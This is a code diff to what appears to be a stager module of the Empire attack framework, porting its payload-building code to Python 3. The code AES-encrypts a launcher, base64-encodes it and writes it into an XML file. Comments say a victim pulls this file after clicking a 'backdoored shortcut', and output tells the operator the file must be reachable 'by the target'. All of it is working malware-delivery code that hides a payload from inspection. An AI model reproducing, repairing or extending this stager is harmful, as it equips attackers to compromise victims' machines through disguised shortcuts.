@@ -8,6 +8,7 @@ from xlutils.copy import copy
 from xlwt import Workbook, Utils
 from lib.common import helpers
 from Crypto.Cipher import AES
+import os
 
 
 class Stager(object):
@@ -151,7 +152,7 @@ class Stager(object):
             if ch in encKey:
                 encKey = encKey.replace(ch, random.choice(string.ascii_lowercase))
         encIV = random.randint(1, 240)
-        
+
         # generate the launcher
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=False,
                                                            userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds,
@@ -253,11 +254,14 @@ class Stager(object):
                 color="green"))
             
             # encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
-            ivBuf = ""
+            ivBuf = ("").encode('UTF-8')
             for z in range(0, 16):
-                ivBuf = ivBuf + chr(encIV + z)
-            encryptor = AES.new(str(encKey, "utf-8"), AES.MODE_CBC, ivBuf)
-            launcher = str(launcher, "utf-8")
+                IV = encIV + z
+                IV = IV.to_bytes(1, byteorder='big')
+                ivBuf = b"".join([ivBuf,IV])
+
+            encryptor = AES.new(encKey, AES.MODE_CBC, ivBuf)
+
             # pkcs7 padding - aes standard on Windows - if this padding mechanism is used we do not need to define padding in our macro code, saving space
             padding = 16 - (len(launcher) % 16)
             if padding == 0:
@@ -266,15 +270,15 @@ class Stager(object):
                 launcher = launcher + (chr(padding) * padding)
             
             cipher_text = encryptor.encrypt(launcher)
-            cipher_text = helpers.encode_base64(ivBuf + cipher_text)
+            cipher_text = helpers.encode_base64(b"".join([ivBuf,cipher_text]))
 
             # write XML to disk
             print(helpers.color("Writing xml...\n", color="blue"))
-            fileWrite = open(XmlOut, "w")
-            fileWrite.write("<?xml version=\"1.0\"?>\n")
-            fileWrite.write("<main>")
+            fileWrite = open(XmlOut, "wb")
+            fileWrite.write(b"<?xml version=\"1.0\"?>\n")
+            fileWrite.write(b"<main>")
             fileWrite.write(cipher_text)
-            fileWrite.write("</main>\n")
+            fileWrite.write(b"</main>\n")
             fileWrite.close()
             print(helpers.color(
                 "xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n",
